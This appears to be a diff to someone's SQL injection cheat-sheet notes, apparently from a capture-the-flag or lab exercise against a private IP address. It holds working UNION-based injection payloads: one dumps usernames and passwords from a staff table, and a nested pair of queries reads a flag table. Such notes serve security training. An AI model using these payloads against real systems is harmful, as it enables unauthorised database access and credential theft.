@@ -10,6 +10,12 @@ If Union Base SQL Injection Have:
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 
 
+--------- dump data from 2 different tables ----------
+
+http://10.10.8.191/user?id=2%20UNION%20ALL%20SELECT%20%271%20union%20select%201,flag,3,4%20from%20flag%27,%202,3%20from%20users
+
+2 UNION ALL SELECT '1 union select 1,flag,3,4 from flag', 2,3 from users
+
 -------------------  --------------------
 -------------------  --------------------
 
